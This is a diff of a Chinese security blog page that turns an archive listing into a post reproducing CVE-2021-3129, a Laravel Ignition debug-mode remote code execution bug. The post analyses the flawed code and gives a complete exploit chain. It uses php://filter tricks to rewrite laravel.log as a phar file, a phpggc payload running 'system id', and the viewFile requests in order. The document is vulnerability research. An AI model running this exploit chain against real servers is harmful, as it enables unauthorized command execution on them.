@@ -107,7 +107,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="漏洞研究,">
 
 
 
@@ -120,13 +120,23 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Tyaoo&#39;s Blog">
-<meta property="og:url" content="https://tyaoo.github.io/archives/page/2/index.html">
+<meta name="description" content="CVE-2021-3129 Laravel &amp;lt;= 8.4.2 Ignition &amp;lt;= 2.5.1">
+<meta name="keywords" content="漏洞研究">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Laravel Debug mode RCE复现">
+<meta property="og:url" content="https://tyaoo.github.io/2021/05/28/Laravel-Debug-mode-RCE复现/index.html">
 <meta property="og:site_name" content="Tyaoo&#39;s Blog">
+<meta property="og:description" content="CVE-2021-3129 Laravel &amp;lt;= 8.4.2 Ignition &amp;lt;= 2.5.1">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105281210fa90afa0a5cfb6e9438b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105281211e62811b5bb60e97317a9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105281052e3a43478f71ec9e13073.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021052811469e4b69a8d859b25c0a80.png">
+<meta property="og:updated_time" content="2021-05-28T07:05:32.002Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Tyaoo&#39;s Blog">
+<meta name="twitter:title" content="Laravel Debug mode RCE复现">
+<meta name="twitter:description" content="CVE-2021-3129 Laravel &amp;lt;= 8.4.2 Ignition &amp;lt;= 2.5.1">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105281210fa90afa0a5cfb6e9438b.png">
 
 
 
@@ -156,13 +166,13 @@
 
 
 
-  <link rel="canonical" href="https://tyaoo.github.io/archives/page/2/">
+  <link rel="canonical" href="https://tyaoo.github.io/2021/05/28/Laravel-Debug-mode-RCE复现/">
 
 
 
 
 
-  <title>归档 | Tyaoo's Blog</title>
+  <title>Laravel Debug mode RCE复现 | Tyaoo's Blog</title>
   
 
 
@@ -181,7 +191,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -297,395 +307,336 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
 
-      <span class="archive-page-counter">
-        
-        
-         
-        
-        OK! 目前共计 31 篇日志。 继续努力。
-      </span>
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://tyaoo.github.io/2021/05/28/Laravel-Debug-mode-RCE复现/">
 
-      
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tyaoo">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tyaoo's Blog">
+    </span>
+
+    
+      <header class="post-header">
 
         
         
+          <h1 class="post-title" itemprop="name headline">Laravel Debug mode RCE复现</h1>
         
 
-        
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-05-28T14:15:46+08:00">
+                2021-05-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2021">2021</h1>
-          </div>
-        
-        
 
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2021/02/02/WebLogic漏洞研究/" itemprop="url">
-              
-                <span itemprop="name">WebLogic反序列化漏洞研究</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2021-02-02T22:33:50+08:00" content="2021-02-02">
-          02-02
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2020">2020</h1>
-          </div>
-        
-        
+            
+          
 
-        
+          
+          
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+          
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2020/12/17/Vulnstack-红队实战/" itemprop="url">
-              
-                <span itemprop="name">Vulnstack 红队实战</span>
-              
-            </a>
-        
-      </h2>
+          
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2020-12-17T15:35:08+08:00" content="2020-12-17">
-          12-17
-        </time>
-      </div>
+          
 
-    </header>
-  </article>
+        </div>
+      </header>
+    
 
-
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2020/09/29/2020-0CTF-Unlimited/" itemprop="url">
-              
-                <span itemprop="name">2020 0CTF Unlimited</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2020-09-29T15:10:02+08:00" content="2020-09-29">
-          09-29
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
-        
-        
-        
+      
+        <blockquote>
+<p>CVE-2021-3129</p>
+<p>Laravel &lt;= 8.4.2</p>
+<p>Ignition &lt;= 2.5.1</p>
+</blockquote>
+<a id="more"></a>
 
-        
-        
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
+<p>在kali2020下复现</p>
+</blockquote>
+<pre><code class="cmd">git clone https://github.com/laravel/laravel.git    # 下载laravel源码
+cd laravel                                            # 切换到laravel目录
+git checkout -b e849812                              # 切换到存在漏洞的分支
+composer update                                        # 更新composer
+composer install                                       # composer安装依赖
+composer require facade/ignition==2.5.1                # 下载存在漏洞版本组件
+mv .env.example .env                                # 更改.env文件
+php artisan key:generate                             # 生成Application key
+php artisan serve                                    # 启动服务器</code></pre>
+<p> 创建<code>resource/views/hello.blade.php</code>模板</p>
+<pre><code class="html">&lt;html&gt;
+    &lt;body&gt;
+        &lt;h1&gt;hello, {{ $username }}&lt;/h1&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p> 在<code>routes/web.php</code>中添加路由</p>
+<pre><code class="php">Route::get(&#39;/hello&#39;, function () {
+    return view(&#39;hello&#39;);
+});</code></pre>
+<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>在修正未定义变量时存在一处<code>file_get_contents()</code>和一处<code>file_put_contents()</code>函数的第一参数可控，且在laravel中我们可以往log文件插入部分可控内容，且我们对log文件具有可写权限，导致我们可以通过把log文件覆写为phar文件，再通过phar反序列化实现命令执行</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调用栈分析"><a href="#调用栈分析" class="headerlink" title="调用栈分析"></a>调用栈分析</h3><p>访问新添加的路由<code>/laravel/public/hello</code>会抛出变量名未定义的错误，出现了一个按钮并提示按样例修改模板</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105281210fa90afa0a5cfb6e9438b.png" alt="image-20210525133932073" style="zoom: 67%;">
 
-        
+<p>点击<code>Make variable optional</code>按钮并抓包，发生漏洞的接口就是在<code>/laravel/public/_ignition/execute-solution</code>这里，可以看到这里传入了<code>viewFile</code>参数对文件进行操作</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105281211e62811b5bb60e97317a9.png" alt="image-20210525141459623"></p>
+<p>通过在源码搜索<code>execute-solution</code>可以搜索到Web接口，可以看到<code>ExecuteSolutionController</code>类对象被当成函数调用，所以最终会触发其<code>__invoke()</code>函数</p>
+<pre><code class="php">namespace Facade\Ignition;
+class IgnitionServiceProvider extends ServiceProvider
+{
+    Route::post(&#39;execute-solution&#39;, ExecuteSolutionController::class) // 调用__invoke()函数
+        -&gt;middleware(IgnitionConfigValueEnabled::class.&#39;:enableRunnableSolutions&#39;)
+        -&gt;name(&#39;executeSolution&#39;);</code></pre>
+<p>我们跟进一下它的<code>__invoke()</code>函数，第一步是初始化变量，第二部就是处理参数</p>
+<pre><code class="php">namespace Facade\Ignition\Http\Controllers;
+class ExecuteSolutionController
+{
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+    public function __invoke(
+        ExecuteSolutionRequest $request,
+        SolutionProviderRepository $solutionProviderRepository
+    ) {
+        $solution = $request-&gt;getRunnableSolution();
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2020/08/31/2020-GACTF-web/" itemprop="url">
-              
-                <span itemprop="name">2020 GACTF web</span>
-              
-            </a>
-        
-      </h2>
+        $solution-&gt;run($request-&gt;get(&#39;parameters&#39;, [])); // 跟进参数处理函数
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2020-08-31T09:45:54+08:00" content="2020-08-31">
-          08-31
-        </time>
-      </div>
+        return response(&#39;&#39;);
+    }
+}</code></pre>
+<p>根据<code>run()</code>函数，我们看到了<code>file_put_contents()</code>函数的第一个参数可控，我们还得跟进一下<code>makeOptional()</code>函数</p>
+<pre><code class="php">namespace Facade\Ignition\Solutions;
+class MakeViewVariableOptionalSolution implements RunnableSolution
+{
+    public function run(array $parameters = [])
+    {
+        $output = $this-&gt;makeOptional($parameters);
+        if ($output !== false) {
+            file_put_contents($parameters[&#39;viewFile&#39;], $output); // file_put_contents()的第一参数可控
+        }
+    }</code></pre>
+<p>在这里我们又看到了<code>file_get_contents()</code>函数第一个参数可控，后面就是修正操作，即为模板中的未定义变量添加一个判断条件</p>
+<pre><code class="php">namespace Facade\Ignition\Solutions;
+class MakeViewVariableOptionalSolution implements RunnableSolution
+{
+    public function makeOptional(array $parameters = [])
+    {
+        $originalContents = file_get_contents($parameters[&#39;viewFile&#39;]); // file_get_contents()的第一参数可控
+        $newContents = str_replace(&#39;$&#39;.$parameters[&#39;variableName&#39;], &#39;$&#39;.$parameters[&#39;variableName&#39;].&quot; ?? &#39;&#39;&quot;, $originalContents);
 
-    </header>
-  </article>
+        $originalTokens = token_get_all(Blade::compileString($originalContents));
+        $newTokens = token_get_all(Blade::compileString($newContents));
 
+        $expectedTokens = $this-&gt;generateExpectedTokens($originalTokens, $parameters[&#39;variableName&#39;]);
 
+        if ($expectedTokens !== $newTokens) {
+            return false;
+        }
+
+        return $newContents;
+    }</code></pre>
+<p>所以我们可以把上面的代码浓缩为下面两行，简称先读后写</p>
+<blockquote>
+<p>应该有好些不知名CMS都有这么写过</p>
+</blockquote>
+<pre><code class="php">$output = file_get_contents($parameters[&#39;viewFile&#39;]);
+file_put_contents($parameters[&#39;viewFile&#39;], $output);</code></pre>
+<h3 id="日志部分可控"><a href="#日志部分可控" class="headerlink" title="日志部分可控"></a>日志部分可控</h3><p>另外，我们可以对laravel的日志文件插入部分可控内容，默认目录是<code>storage/logs/laravel.log</code></p>
+<p>比如当我们传入</p>
+<pre><code class="php">viewFile: This is the controlled part</code></pre>
+<p>我们可以发现<code>laravel.log</code>文件中出现了报错信息，其中有两处<code>This is the controlled part</code>字段，同时还有一处带省略号的（提前警告这是个坑）</p>
+<pre><code>[2021-05-27 13:08:30] local.ERROR: file_get_contents(This is the controlled part): failed to open stream: No such file or directory {&quot;exception&quot;:&quot;[object] (ErrorException(code: 0): file_get_contents(This is the controlled part): failed to open stream: No such file or directory at xxxxxx\\laravel\\vendor\\facade\\ignition\\src\\Solutions\\MakeViewVariableOptionalSolution.php:75)
+[stacktrace]
+#0 [internal function]: Illuminate\\Foundation\\Bootstrap\\HandleExceptions-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;xxxxxx...&#39;, 75, Array)
+#1 xxxxxx\\laravel\\vendor\\facade\\ignition\\src\\Solutions\\MakeViewVariableOptionalSolution.php(75): file_get_contents(&#39;This is control...&#39;)</code></pre><p>它的大体结构如下面所示</p>
+<pre><code>[label1] payload [label2] payload [label3]</code></pre><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><blockquote>
+<p>官方文档：<a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/filters.php</a></p>
+</blockquote>
+<p>所以我们的核心问题变成了如何向log文件写入一个合法的phar文件，这里我们需要利用到强大的<code>php://filter</code>，我们可以利用特别的编码和解码方法来对我们插入的内容进行修改</p>
+<p><strong>清空文件</strong></p>
+<p>第一个思路是我们可以用base64在解码时会自动丢弃无效字符的方法进行清空，所以按理来说只要我们多次对内容进行base64解码，那么最终就会把所有字符丢弃</p>
+<pre><code>php://filter/read=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=../storage/logs/laravel.log</code></pre><p>但是如果文本当中出现<code>&#39;=&#39;</code>字符，<code>base64-decode</code>会抛出错误导致写入失败</p>
+<p>所以<strong>@CHARLES FOL</strong>使用到的是php内置的官方文档未提及的<code>consumed</code>过滤器，可以直接返回空</p>
+<pre><code>php://filter/read=consumed/resource=../storage/logs/laravel.log</code></pre><p>自己尝试了一下如果服务器的php支持<code>zlib</code>或者<code>bzip2</code>的话，也可以利用解压失败返回空的性质进行清空</p>
+<pre><code>php://filter/read=zlib.inflate/resource=../storage/logs/laravel.log
+php://filter/read=bzip2.decompress/resource=../storage/logs/laravel.log</code></pre><p><strong>写入payload</strong></p>
+<p>在<code>php://filter</code>中有一个很好用的转换过滤器<code>iconv.utf16le.utf-8</code>，它能够把<code>UTF-16</code>字符转化为<code>UTF-8</code>字符，样例如下：</p>
+<pre><code class="shell">echo -ne &#39;[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0[midfix]P\0A\0Y\0L\0O\0A\0D\0[Some suffix ]&#39; &gt; /tmp/test.txt</code></pre>
+<pre><code class="shell">php -r &quot;echo file_get_contents(&#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#39;);&quot;
+# 卛浯⁥牰晥硩崠PAYLOAD浛摩楦嵸PAYLOAD卛浯⁥畳晦硩崠</code></pre>
+<p>既可以传入我们完整的payload，又可以让其他正常字符转为无效字符，之后我们直接base64-decode即可写入payload</p>
+<p>为了只留下一个payload字段，我们可以在payload的末尾添加一个byte的字符进行干扰即可，如：</p>
+<pre><code class="shell">echo -ne &#39;[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0X[midfix]P\0A\0Y\0L\0O\0A\0D\0X[Some suffix ]&#39; &gt; /tmp/test.txt</code></pre>
+<pre><code class="shell">php -r &quot;echo file_get_contents(&#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#39;);&quot;
+# 卛浯⁥牰晥硩崠PAYLOAD存業晤硩偝䄀夀䰀伀䄀䐀堀卛浯⁥畳晦硩崠</code></pre>
+<p>相应的限制条件是：</p>
+<ol>
+<li>保证第一个payload字段前面的字符串长度是<code>2*n bytes</code>，不然无法解码出payload</li>
+<li>保证整个字符串的总体长度是<code>2*n bytes</code>，不然会抛出以下错误<code>file_get_contents(): iconv stream filter (&quot;utf16le&quot;=&gt;&quot;utf-8&quot;): invalid multibyte sequence</code></li>
+</ol>
+<p>解决方案：</p>
+<ol>
+<li>因为日志文件部分内容可控，我们可以把前面的内容刚好填充到<code>2*n bytes</code></li>
+<li>可以用同一种方法，也可以选择把payload复写两次</li>
+</ol>
+<p><strong>写入0字节</strong></p>
+<p>最后一个问题就是我们无法向日志写入<code>\0</code>字节，这时候我们又可以用到一个转换过滤器<code>convert.quoted-printable-decode</code></p>
+<blockquote>
+<p><strong>官方说明</strong></p>
+<pre><code class="c">quoted_printable_decode ( string $str ) : string</code></pre>
+<p>该函数返回 quoted-printable 解码之后的 8-bit 字符串 (参考 <a href="http://www.faqs.org/rfcs/rfc2045" target="_blank" rel="noopener">» RFC2045</a> 的6.7章节，而不是 <a href="http://www.faqs.org/rfcs/rfc2821" target="_blank" rel="noopener">» RFC2821</a> 的4.5.2章节)</p>
+<p><strong>格式</strong></p>
+<p>(General 8bit representation) Any octet, except a CR or LF that is part of a CRLF line break of the canonical (standard) form of the data being encoded, may be represented by an “=” followed by a two digit hexadecimal representation of the octet’s value.  The digits of the hexadecimal alphabet, for this purpose, are “0123456789ABCDEF”.  Uppercase letters must be used; lowercase letters are not allowed.  Thus, for example, the decimal value 12 (US-ASCII form feed) can be represented by “=0C”, and the decimal value 61 (US- ASCII EQUAL SIGN) can be represented by “=3D”.  This rule must be followed except when the following rules allow an alternative encoding.</p>
+</blockquote>
+<p>简单来说就是将格式为<code>&quot;=&lt;hex&gt;&quot;</code>的字符串转发为对应ascii的字符串，所以我们可以将空字节编码为<code>&quot;=00&quot;</code>传入</p>
+<p>所以最终我们写入payload方法为</p>
+<pre><code>php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log</code></pre><p><strong>生成payload</strong></p>
+<p>payload的生成我们可以反序列化工具<code>phpggc</code></p>
+<blockquote>
+<p><a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">https://github.com/ambionics/phpggc</a></p>
+</blockquote>
+<pre><code class="shell">php -d &#39;phar.readonly=0&#39; ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E &#39;s/=+$//g&#39; | sed -E &#39;s/./\0=00/g&#39;</code></pre>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><pre><code class="shell"># 使用phpggc创建payload，注意这里最后添加了一个&#39;=00&#39;，用来屏蔽第二处payload回显
+php -d &#39;phar.readonly=0&#39; ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | python -c &quot;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:].zfill(2) + &#39;=00&#39; for i in sys.stdin.read()]).upper() + &#39;=00&#39;)&quot;
+# 清空log文件
+viewFile: php://filter/read=consumed/resource=../storage/logs/laravel.log
+# 传入字符使文本对齐，这里可传入任意文本
+viewFile: tyao
+# 传入payload
+viewFile: =50=00=44=00=39=00=77=00=61=00=48=00...
+# 解码payload
+viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
+# phar反序列化
+viewFile: phar://../storage/logs/laravel.log</code></pre>
+<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><ol>
+<li><p>如果传入的是形如<code>P=00D=009=00w=00...</code>的payload，倒数第二部有可能会产生<code>quoted-printable-decode</code>解码错误，原因如下，有一处省略的地方出现了<code>&quot;=0.&quot;</code>字符串导致解码失败，解决方法是将首字符<code>&#39;P&#39;</code>也进行编码就可以对齐了，懒人方法就是将所有字符进行编码 : &gt;</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105281052e3a43478f71ec9e13073.png" alt="image-20210528024447449"></p>
+</li>
+<li><p>windows下复现失败了，因为是只要在base64的payload中存在<code>&#39;=&#39;</code>时，使用<code>convert.base64-decode</code>过滤器会报错返回空</p>
+</li>
+<li><p>针对第二种情况，我们将payload的命令进行填充至无<code>&#39;=&#39;</code>出现，但是phar协议反序列化时会报phar文件签名错误，大概率是因为<code>phpggc</code>只能在Linux下使用</p>
+<pre><code>failed to open stream: phar &amp;quot;xxxx\\laravel\\storage\\logs\\laravel.log&amp;quot; has a broken signature&quot;</code></pre></li>
+<li><p>如果想要在windows复现估计得重新写一个序列化，为了不麻烦自己，还是在跑去虚拟机复现成功了</p>
+</li>
+</ol>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021052811469e4b69a8d859b25c0a80.png" alt="image-20210528114607301" style="zoom:67%;">
+
+<ol start="5">
+<li>失败的建议多打几次</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/351363561" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/351363561</a></p>
+<p><a href="https://anquan.baidu.com/article/1286" target="_blank" rel="noopener">https://anquan.baidu.com/article/1286</a></p>
+<p><a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener">https://www.ambionics.io/blog/laravel-debug-rce</a></p>
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2020/08/29/2020-强网杯-web/" itemprop="url">
-              
-                <span itemprop="name">2020 强网杯 web</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2020-08-29T09:45:45+08:00" content="2020-08-29">
-          08-29
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2020/08/23/2020-CISCN-Web/" itemprop="url">
-              
-                <span itemprop="name">2020 CISCN Web</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2020-08-23T21:15:53+08:00" content="2020-08-23">
-          08-23
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2020/08/01/Shiro-1-2-4-反序列化链分析/" itemprop="url">
-              
-                <span itemprop="name">Shiro 1.2.4 反序列化链分析</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2020-08-01T00:54:01+08:00" content="2020-08-01">
-          08-01
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2020/07/28/ThinkPHP6-0反序列漏洞分析/" itemprop="url">
-              
-                <span itemprop="name">ThinkPHP6.0反序列漏洞分析</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2020-07-28T08:53:03+08:00" content="2020-07-28">
-          07-28
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2020/05/28/2020-GKCTF-Web/" itemprop="url">
-              
-                <span itemprop="name">2020-GKCTF-WEB</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2020-05-28T16:35:58+08:00" content="2020-05-28">
-          05-28
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2020/05/27/Linux提权小知识/" itemprop="url">
-              
-                <span itemprop="name">Linux提权小知识</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2020-05-27T22:09:24+08:00" content="2020-05-27">
-          05-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
     </div>
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+    
+</div>
+      
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/漏洞研究/" rel="tag"># 漏洞研究</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/05/25/FastJson反序列化漏洞研究/" rel="next" title="Fastjson反序列化漏洞研究">
+                <i class="fa fa-chevron-left"></i> Fastjson反序列化漏洞研究
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/archives/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/archives/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/page/3/">3</a><a class="page-number" href="/archives/page/4/">4</a><a class="extend next" rel="next" href="/archives/page/3/"><i class="fa fa-angle-right"></i></a>
-  </nav>
+  </article>
 
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -693,6 +644,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -713,8 +668,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -784,6 +748,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原因"><span class="nav-number">2.</span> <span class="nav-text">漏洞原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#调用栈分析"><span class="nav-number">3.1.</span> <span class="nav-text">调用栈分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#日志部分可控"><span class="nav-number">3.2.</span> <span class="nav-text">日志部分可控</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-filter"><span class="nav-number">3.3.</span> <span class="nav-text">php://filter</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#坑点"><span class="nav-number">5.</span> <span class="nav-text">坑点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -935,6 +915,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
